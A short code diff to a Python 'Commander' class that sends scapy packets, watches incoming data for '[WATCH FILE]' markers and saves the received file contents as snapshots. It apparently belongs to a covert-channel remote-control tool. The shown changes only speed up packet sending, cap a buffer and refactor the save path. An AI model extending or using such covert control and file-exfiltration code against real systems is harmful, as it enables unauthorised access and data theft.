@@ -78,7 +78,7 @@ class Commander:
                     flags="A"
                 )
                 send(pkt, verbose=False)
-                time.sleep(0.01)
+                time.sleep(0.003)
             except Exception as e:
                 print(f"[!] Error sending packet: {e}")
                 return False
@@ -135,6 +135,9 @@ class Commander:
 
                     # Always append to watch buffer for marker detection
                     self.watch_buffer += char
+                    # prevent infinite buffer growth
+                    if len(self.watch_buffer) > 50000:
+                        self.watch_buffer = self.watch_buffer[-20000:]
 
                     # Detect watch start
                     if "[WATCH FILE]" in self.watch_buffer and not self.watch_receiving:
@@ -198,14 +201,8 @@ class Commander:
         if not self.watch_current_file:
             return
 
-        watch_dir = "./watched"
-        os.makedirs(watch_dir, exist_ok=True)
-
-        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-        rel = Path(self.watch_current_file)
-
-        snapshot_name = f"{rel.stem}_{ts}{rel.suffix}"
-        save_path = os.path.join(watch_dir, snapshot_name)
+        save_path = self._snapshot_path(self.watch_current_file)
+        os.makedirs(save_path.parent, exist_ok=True)
 
         content = self.watch_buffer
 
